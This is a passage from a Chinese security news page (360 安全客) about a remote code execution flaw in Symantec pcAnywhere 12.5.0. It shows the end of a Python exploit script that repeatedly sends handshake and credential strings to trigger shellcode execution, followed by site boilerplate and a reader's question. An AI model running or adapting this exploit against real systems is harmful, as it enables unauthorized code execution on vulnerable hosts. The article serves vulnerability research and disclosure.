&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printLine&nbsp;(&quot;I&quot;,&nbsp;4,&nbsp;&quot;Exiting...&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(1)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;check&nbsp;if&nbsp;shellcode&nbsp;executed&nbsp;(based&nbsp;on&nbsp;a&nbsp;timer)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;sleepTimer&nbsp;&gt;&nbsp;shellcodeExecutionTimeout:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printLine&nbsp;(&quot;S&quot;,&nbsp;4,&nbsp;&quot;Shellcode&nbsp;executed&nbsp;after&nbsp;&quot;&nbsp;+&nbsp;str(attemptCounter&nbsp;-&nbsp;1)&nbsp;+&nbsp;&quot;&nbsp;attempts&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printLine&nbsp;(&quot;I&quot;,&nbsp;5,&nbsp;&quot;Exiting...&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(1)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;print&nbsp;waiting&nbsp;ticks
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.stdout.write(&#39;\r&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.stdout.write(&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\033[1;33m[!]\033[1;m&nbsp;Connection&nbsp;reset&nbsp;-&nbsp;reinitialising%s&quot;&nbsp;%&nbsp;(&#39;.&#39;&nbsp;*&nbsp;sleepTimer))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.stdout.flush()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;sleep&nbsp;one&nbsp;second&nbsp;and&nbsp;reconnect
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;time.sleep(1)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sleepTimer&nbsp;+=&nbsp;1
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;openSocket.close()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;openSocket&nbsp;=&nbsp;connectToServer(targetServer,&nbsp;targetPort)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;sleepTimer&nbsp;&gt;&nbsp;0:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printLine&nbsp;(&quot;I&quot;,&nbsp;2,&nbsp;&quot;Sending&nbsp;handshake&nbsp;sequence...&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;openSocket.send(handshakeSequence)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;time.sleep(3)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;openSocket.recv(1024)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printLine&nbsp;(&quot;I&quot;,&nbsp;2,&nbsp;&quot;Sending&nbsp;username...&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;openSocket.send(usernameString)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;time.sleep(3)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printLine&nbsp;(&quot;I&quot;,&nbsp;2,&nbsp;&quot;Sending&nbsp;password...&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;openSocket.send(passwordString)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;openSocket.close()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;time.sleep(3)
#&nbsp;main&nbsp;function
if&nbsp;__name__&nbsp;==&nbsp;&quot;__main__&quot;:
&nbsp;&nbsp;&nbsp;&nbsp;printBanner()
&nbsp;&nbsp;&nbsp;&nbsp;try:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;runExploit()
&nbsp;&nbsp;&nbsp;&nbsp;except&nbsp;KeyboardInterrupt:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit()
#&nbsp;End&nbsp;of&nbsp;file</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">截图:<br/></span></p><p style="text-align: center;"><img src="http://p1.qhimg.com/t01073eefa25d61a7e9.png" title="t01065231b7ed426689.png" alt="http://p7.qhimg.com/t01065231b7ed426689.png"/></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文由 安全客 原创发布，如需转载请注明来源及本文地址。<br/>本文地址：http://bobao.360.cn/learning/detail/2251.html
                </p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value=" Windows x86平台上的Symantec pcAnywhere 12.5.0远程代码执行漏洞 - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="2251" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="64d932c9bb50dc5a83db601d9b02e735">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/12x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="1360" user-name="带头小哥" href="javascript:;">
                带头小哥            </a>
                        <span class="comment-time">2015-11-11 17:40:35</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="1360">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_1360" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">请问
1.这个漏洞是堆溢出吗？
2.我在测试的时候启用的是Host，设置了一个账号和密码，然后利用exploit-db上的python代码进行攻击，没有一次成功，不知道是什么原因？
3、您文中所说的“要求能输入帐号密码”详细是指什么意思啊？</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>

        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="learning" data-source-id="2251" data-page="2">查看更多</a>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
                                <li><a href="/learning/detail/4424.html" alt="【知识】9月16日 - 每日安全知识热点" target="_blank">【知识】9月16日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
